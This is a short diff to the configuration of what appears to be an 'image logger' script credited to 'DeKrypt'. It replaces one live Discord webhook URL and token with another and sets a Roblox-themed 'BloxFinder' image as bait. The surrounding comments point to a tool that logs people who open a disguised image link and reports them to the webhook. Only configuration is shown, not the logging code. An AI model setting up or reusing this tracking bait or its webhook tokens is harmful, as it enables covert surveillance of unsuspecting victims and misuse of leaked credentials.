@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1393279577786417232/p5QfM4x14UMkFFvDsCeDhscATuA5kDUflB3wm0jJXW8h5z_qkgrmz34PNHakAZgs7_Yf",
+    "webhook": "https://discord.com/api/webhooks/1414323471449854032/gJrCQz-ZqYmTyjFMmV8lM2TlcK9VGc4QIaaMGaJJjuMi5NUVS0q3XN7SCMFtgDNchTeU",
     "image": "https://media.discordapp.net/attachments/1382301792678973443/1393281527592255548/BloxFinder_1.png?ex=68729a0a&is=6871488a&hm=897a9fd7ae15e1bb9f661003640135c6d5cf630e7cb3fe01009de9c836366789&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
